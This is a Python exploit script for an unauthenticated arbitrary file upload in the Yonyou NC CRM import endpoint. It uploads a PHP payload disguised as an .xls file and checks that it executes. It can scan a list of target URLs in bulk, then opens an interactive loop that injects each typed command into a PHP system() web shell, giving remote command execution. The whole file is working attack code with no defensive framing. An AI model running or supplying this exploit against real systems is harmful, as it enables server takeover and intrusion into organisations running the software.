import requests
import urllib3
import string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
import json
import urllib.request
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/crmtools/tools/import.php?DontCheckLogin=1&issubmit=1")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryB9S6D2q4J3f7Y1Z5"
    }
    data = """------WebKitFormBoundaryB9S6D2q4J3f7Y1Z5\r\nContent-Disposition: form-data; name="xfile"; filename="1.xls"\r\n\r\n<?php echo "HelloWorldTest";unlink(__FILE__);?>\r\n------WebKitFormBoundaryB9S6D2q4J3f7Y1Z5\r\nContent-Disposition: form-data; name="combo"\r\n\r\nceshi.php\r\n------WebKitFormBoundaryB9S6D2q4J3f7Y1Z5--"""
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and 'Database' in response.text and 'Source' in response.text and 'connectionID' in response.text:
            result_url = urljoin(url,'/tmpfile/ceshi.php')
            result_response = requests.get(result_url,timeout=15,verify=False,headers = {"User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",})
            if result_response.status_code == 200 and 'HelloWorldTest' in result_response.text:
                print(f"\033[31mDiscovered:{url}: YongYouNC_uploadFile_ArbitraryFileFUpload!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/crmtools/tools/import.php?DontCheckLogin=1&issubmit=1")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryB9S6D2q4J3f7Y1Z5"
    }
    try:
        if check(url):
            while True:
                command = input("\033[34mPlease input command (stop input:exit):\033[0m")
                if "exit" not in command:
                    data = """------WebKitFormBoundaryB9S6D2q4J3f7Y1Z5\r\nContent-Disposition: form-data; name="xfile"; filename="1.xls"\r\n\r\n<?php system("{}");unlink(__FILE__);?>\r\n------WebKitFormBoundaryB9S6D2q4J3f7Y1Z5\r\nContent-Disposition: form-data; name="combo"\r\n\r\ntest.php\r\n------WebKitFormBoundaryB9S6D2q4J3f7Y1Z5--""".format(command)
                    response = requests.post(target, verify=False, data=data, headers=headers, timeout=15)
                    if response.status_code == 200 and 'Database' in response.text and 'Source' in response.text and 'connectionID' in response.text:
                        result_url = urljoin(url, '/tmpfile/test.php')
                        result_response = requests.get(result_url, timeout=15, verify=False, headers={"User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36", })
                        if result_response.status_code == 200:
                                print(result_response.text)
                else:
                    break
    except Exception as e:
        pass
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")